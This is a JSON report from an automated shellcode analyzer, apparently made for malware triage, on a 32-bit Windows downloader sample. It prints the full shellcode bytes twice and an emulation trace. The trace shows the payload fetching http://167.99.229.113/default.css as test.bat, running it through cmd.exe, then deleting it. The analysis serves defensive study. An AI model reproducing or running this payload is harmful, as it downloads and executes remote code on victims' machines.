{
   "dateAnalyzed": "2022-04-13 09:54:09",
   "classification": "Very likely shellcode.",
   "reason": "Found shellcode APIs.",
   "secondsSinceEpoch": 1649861649.690976,
   "fileType": "rawHex",
   "bits": 32,
   "entryPoint": "0x0",
   "md5": "8d141c256325b0e7b8d8270b42b04058",
   "sha256": "4136a45dbdd356c8fe2be261e3649de2c0a8e6b52596e629ba9c94c51ade139d",
   "ssdeep": "12:KutlT1K4lHlhD6asH5QDMrt3J6srDmJ02sILcWobHEUJI:Xt3KglxxsZgMZ6+i02sILT",
   "pushret": [],
   "callpop": [
      {
         "address": "0x0",
         "modSecName": "rawHex",
         "pop_offset": "0x5",
         "distance": 5,
         "disassembly": [
            "0x0        call 5 ",
            "0x5        pop  edx "
         ],
         "disasm": [
            {
               "offset": "0x0",
               "instruction": "call 5"
            },
            {
               "offset": "0x5",
               "instruction": "pop edx"
            }
         ],
         "internalData": {
            "secNum": -1,
            "NumOpsDis": 7
         }
      }
   ],
   "PEB": [
      {
         "address": "0xc6",
         "modSecName": "rawHex",
         "disassembly": [
            "0xc6       mov  edi, dword ptr fs:[0x30] ",
            "0xcd       mov  edi, dword ptr [edi + 0xc] ",
            "0xd0       mov  edi, dword ptr [edi + 0x14] ",
            "0xd3       mov  esi, dword ptr [edi + 0x28] ",
            "0xd6       xor  edx, edx "
         ],
         "disasm": [
            {
               "offset": "0xc6",
               "instruction": "mov edi, dword ptr fs:[0x30]"
            },
            {
               "offset": "0xcd",
               "instruction": "mov edi, dword ptr [edi + 0xc]"
            },
            {
               "offset": "0xd0",
               "instruction": "mov edi, dword ptr [edi + 0x14]"
            },
            {
               "offset": "0xd3",
               "instruction": "mov esi, dword ptr [edi + 0x28]"
            },
            {
               "offset": "0xd6",
               "instruction": "xor edx, edx"
            }
         ],
         "internalData": {
            "secNum": -1,
            "NumOpsDis": 19,
            "points": 3
         }
      }
   ],
   "fstenv": [],
   "heavensGate": [],
   "syscall": [],
   "strings": [
      {
         "type": "ascii",
         "offset": "0x168",
         "length": "8",
         "value": "PPPPPPVP",
         "source": "shellcode"
      },
      {
         "type": "ascii",
         "offset": "0x1d3",
         "length": "10",
         "value": "urlmon.dll",
         "source": "shellcode"
      },
      {
         "type": "ascii",
         "offset": "0x1de",
         "length": "19",
         "value": "cmd.exe /c test.bat",
         "source": "shellcode"
      },
      {
         "type": "ascii",
         "offset": "0x1f2",
         "length": "33",
         "value": "http://167.99.229.113/default.css",
         "source": "shellcode"
      },
      {
         "type": "ascii",
         "offset": "0x214",
         "length": "8",
         "value": "test.bat",
         "source": "shellcode"
      },
      {
         "type": "ascii",
         "offset": "0x168",
         "length": "8",
         "value": "PPPPPPVP",
         "source": "shellcode"
      },
      {
         "type": "ascii",
         "offset": "0x1d3",
         "length": "10",
         "value": "urlmon.dll",
         "source": "shellcode"
      },
      {
         "type": "ascii",
         "offset": "0x1de",
         "length": "19",
         "value": "cmd.exe /c test.bat",
         "source": "shellcode"
      },
      {
         "type": "ascii",
         "offset": "0x1f2",
         "length": "33",
         "value": "http://167.99.229.113/default.css",
         "source": "shellcode"
      },
      {
         "type": "ascii",
         "offset": "0x214",
         "length": "8",
         "value": "test.bat",
         "source": "shellcode"
      }
   ],
   "shellcode": {
      "rawhex": "e8000000005a8d52fb52bb8efe1f4be8af0000005a555289c58db2930100008dbaaf010000e8cf0000005a5d55528d82d301000050ff92bb0100005a5d555289c58db2c70100008dbacf010000e8a70000005a5d555231c08db2f20100008dba140200005050575650ffb2cf01000058ffd05a5d31c939c175385552e8f90000005a5d5552e8d40000005a5d55526800300000ffb2bf01000058ffd05a5d55528dba1402000057ffb2b301000058ffd05a5d555231c04050ffb2b701000058ffd05a5dfc31ff648b3d300000008b7f0c8b7f148b772831d266ad84c074113c4172063c5a77020c20c1c20730c2ebe939da8b47108b3f75dbc389ea03523c8b527801ea8b5a2001eb31c957568b368b3b01ef5231d2c1c207321747803f0075f5925a39f0740c83c30441394a1875df5e5fc35e5fad565389eb89de035a248d044b0fb7008d048603421c8b0001f0ab5b5e83c30441813effff000075adc38db2de010000505031c05050505050505650ffb2af01000058ffd0c331c06a406800100000680002000050ffb2c301000058ffd0c3c78a3146dff0f081192b90952680acc8f572993dfe6a7a69ffff0000aa35261464792614309f2614f76e2614373626148e3d261499235dd9ffff0000a42c2a1675726c6d6f6e2e646c6c00636d642e657865202f6320746573742e62617400687474703a2f2f3136372e39392e3232392e3131332f64656661756c742e63737300746573742e62617400",
      "strlit": "\\xe8\\x00\\x00\\x00\\x00\\x5a\\x8d\\x52\\xfb\\x52\\xbb\\x8e\\xfe\\x1f\\x4b\\xe8\\xaf\\x00\\x00\\x00\\x5a\\x55\\x52\\x89\\xc5\\x8d\\xb2\\x93\\x01\\x00\\x00\\x8d\\xba\\xaf\\x01\\x00\\x00\\xe8\\xcf\\x00\\x00\\x00\\x5a\\x5d\\x55\\x52\\x8d\\x82\\xd3\\x01\\x00\\x00\\x50\\xff\\x92\\xbb\\x01\\x00\\x00\\x5a\\x5d\\x55\\x52\\x89\\xc5\\x8d\\xb2\\xc7\\x01\\x00\\x00\\x8d\\xba\\xcf\\x01\\x00\\x00\\xe8\\xa7\\x00\\x00\\x00\\x5a\\x5d\\x55\\x52\\x31\\xc0\\x8d\\xb2\\xf2\\x01\\x00\\x00\\x8d\\xba\\x14\\x02\\x00\\x00\\x50\\x50\\x57\\x56\\x50\\xff\\xb2\\xcf\\x01\\x00\\x00\\x58\\xff\\xd0\\x5a\\x5d\\x31\\xc9\\x39\\xc1\\x75\\x38\\x55\\x52\\xe8\\xf9\\x00\\x00\\x00\\x5a\\x5d\\x55\\x52\\xe8\\xd4\\x00\\x00\\x00\\x5a\\x5d\\x55\\x52\\x68\\x00\\x30\\x00\\x00\\xff\\xb2\\xbf\\x01\\x00\\x00\\x58\\xff\\xd0\\x5a\\x5d\\x55\\x52\\x8d\\xba\\x14\\x02\\x00\\x00\\x57\\xff\\xb2\\xb3\\x01\\x00\\x00\\x58\\xff\\xd0\\x5a\\x5d\\x55\\x52\\x31\\xc0\\x40\\x50\\xff\\xb2\\xb7\\x01\\x00\\x00\\x58\\xff\\xd0\\x5a\\x5d\\xfc\\x31\\xff\\x64\\x8b\\x3d\\x30\\x00\\x00\\x00\\x8b\\x7f\\x0c\\x8b\\x7f\\x14\\x8b\\x77\\x28\\x31\\xd2\\x66\\xad\\x84\\xc0\\x74\\x11\\x3c\\x41\\x72\\x06\\x3c\\x5a\\x77\\x02\\x0c\\x20\\xc1\\xc2\\x07\\x30\\xc2\\xeb\\xe9\\x39\\xda\\x8b\\x47\\x10\\x8b\\x3f\\x75\\xdb\\xc3\\x89\\xea\\x03\\x52\\x3c\\x8b\\x52\\x78\\x01\\xea\\x8b\\x5a\\x20\\x01\\xeb\\x31\\xc9\\x57\\x56\\x8b\\x36\\x8b\\x3b\\x01\\xef\\x52\\x31\\xd2\\xc1\\xc2\\x07\\x32\\x17\\x47\\x80\\x3f\\x00\\x75\\xf5\\x92\\x5a\\x39\\xf0\\x74\\x0c\\x83\\xc3\\x04\\x41\\x39\\x4a\\x18\\x75\\xdf\\x5e\\x5f\\xc3\\x5e\\x5f\\xad\\x56\\x53\\x89\\xeb\\x89\\xde\\x03\\x5a\\x24\\x8d\\x04\\x4b\\x0f\\xb7\\x00\\x8d\\x04\\x86\\x03\\x42\\x1c\\x8b\\x00\\x01\\xf0\\xab\\x5b\\x5e\\x83\\xc3\\x04\\x41\\x81\\x3e\\xff\\xff\\x00\\x00\\x75\\xad\\xc3\\x8d\\xb2\\xde\\x01\\x00\\x00\\x50\\x50\\x31\\xc0\\x50\\x50\\x50\\x50\\x50\\x50\\x56\\x50\\xff\\xb2\\xaf\\x01\\x00\\x00\\x58\\xff\\xd0\\xc3\\x31\\xc0\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x68\\x00\\x02\\x00\\x00\\x50\\xff\\xb2\\xc3\\x01\\x00\\x00\\x58\\xff\\xd0\\xc3\\xc7\\x8a\\x31\\x46\\xdf\\xf0\\xf0\\x81\\x19\\x2b\\x90\\x95\\x26\\x80\\xac\\xc8\\xf5\\x72\\x99\\x3d\\xfe\\x6a\\x7a\\x69\\xff\\xff\\x00\\x00\\xaa\\x35\\x26\\x14\\x64\\x79\\x26\\x14\\x30\\x9f\\x26\\x14\\xf7\\x6e\\x26\\x14\\x37\\x36\\x26\\x14\\x8e\\x3d\\x26\\x14\\x99\\x23\\x5d\\xd9\\xff\\xff\\x00\\x00\\xa4\\x2c\\x2a\\x16\\x75\\x72\\x6c\\x6d\\x6f\\x6e\\x2e\\x64\\x6c\\x6c\\x00\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20\\x74\\x65\\x73\\x74\\x2e\\x62\\x61\\x74\\x00\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x31\\x36\\x37\\x2e\\x39\\x39\\x2e\\x32\\x32\\x39\\x2e\\x31\\x31\\x33\\x2f\\x64\\x65\\x66\\x61\\x75\\x6c\\x74\\x2e\\x63\\x73\\x73\\x00\\x74\\x65\\x73\\x74\\x2e\\x62\\x61\\x74\\x00"
   },
   "deobfuscation": {
      "deobfuscated": false,
      "decoded_stub": "N/A",
      "md5": "N/A",
      "sha256": "N/A",
      "ssdeep": "N/A"
   },
   "emulation": {
      "api_calls": [
         {
            "api_name": "LoadLibraryA",
            "dll_name": "kernel32.dll",
            "return_value": "HINSTANCE 0x16212288",
            "address": "0x12000035",
            "parameters": [
               {
                  "type": "LPCTSTR lpLibFileName",
                  "value": "urlmon.dll"
               }
            ]
         },
         {
            "api_name": "URLDownloadToFileA",
            "dll_name": "kernel32.dll",
            "return_value": "INT S_OK",
            "address": "0x12000070",
            "parameters": [
               {
                  "type": "LPUNKNOWN pCaller",
                  "value": "0x0"
               },
               {
                  "type": "LPCSTR szURL",
                  "value": "http://167.99.229.113/default.css"
               },
               {
                  "type": "LPCSTR szFileName",
                  "value": "test.bat"
               },
               {
                  "type": "DWORD dwReserved",
                  "value": "0x0"
               },
               {
                  "type": "LPBINDSTATUSCALLBACK lpfnCB",
                  "value": "0x0"
               }
            ]
         },
         {
            "api_name": "VirtualAlloc",
            "dll_name": "kernel32.dll",
            "return_value": "INT 0x25000000",
            "address": "0x12000190",
            "parameters": [
               {
                  "type": "LPVOID lpAddress",
                  "value": "0x0"
               },
               {
                  "type": "SIZE_T dwSize",
                  "value": "0x1000"
               },
               {
                  "type": "DWORD flAllocationType",
                  "value": "MEM_COMMIT"
               },
               {
                  "type": "DWORD flProtect",
                  "value": "PAGE_EXECUTE_READWRITE"
               }
            ]
         },
         {
            "api_name": "ProcessCreateA",
            "dll_name": "kernel32.dll",
            "return_value": "INT 0x20",
            "address": "0x12000177",
            "parameters": [
               {
                  "type": "LPCTSTR lpApplicationName",
                  "value": ""
               },
               {
                  "type": "LPTSTR lpCommandLine",
                  "value": "cmd.exe /c test.bat"
               },
               {
                  "type": "LPSECURITY_ATTRIBUTES lpProcessAttributes",
                  "value": "0x0"
               },
               {
                  "type": "LPSECURITY_ATTRIBUTES lpThreadAttributes",
                  "value": "0x0"
               },
               {
                  "type": "BOOL bInheritHandles",
                  "value": "0x0"
               },
               {
                  "type": "DWORD dwCreationFlags",
                  "value": "0x0"
               },
               {
                  "type": "LPVOID lpEnvironment",
                  "value": "0x0"
               },
               {
                  "type": "LPCTSTR lpCurrentDirectory",
                  "value": ""
               },
               {
                  "type": "LPSTARTUPINFO lpStartupInfo",
                  "value": "0x25000000"
               },
               {
                  "type": "LPPROCESS_INFORMATION lpProcessInformation",
                  "value": "0x25000000"
               }
            ]
         },
         {
            "api_name": "Sleep",
            "dll_name": "kernel32.dll",
            "return_value": "INT 0x20",
            "address": "0x1200009a",
            "parameters": [
               {
                  "type": "DWORD dwMilliseconds",
                  "value": "0x3000"
               }
            ]
         },
         {
            "api_name": "DeleteFileA",
            "dll_name": "kernel32.dll",
            "return_value": "INT 0x20",
            "address": "0x120000ae",
            "parameters": [
               {
                  "type": "LPCSTR lpFileName",
                  "value": "test.bat"
               }
            ]
         },
         {
            "api_name": "ExitProcess",
            "dll_name": "kernel32.dll",
            "return_value": " None",
            "address": "0x120000bf",
            "parameters": [
               {
                  "type": "UINT uExitCode",
                  "value": 1
               }
            ]
         }
      ],
      "dlls": [
         "kernel32",
         "urlmon"
      ],
      "artifacts": [
         "urlmon.dll",
         "167.99.229.113/default.css",
         "http",
         "test.bat",
         "cmd.exe"
      ],
      "web_artifacts": [
         "http"
      ],
      "file_artifacts": [],
      "executable_artifacts": [
         "cmd.exe"
      ]
   }
}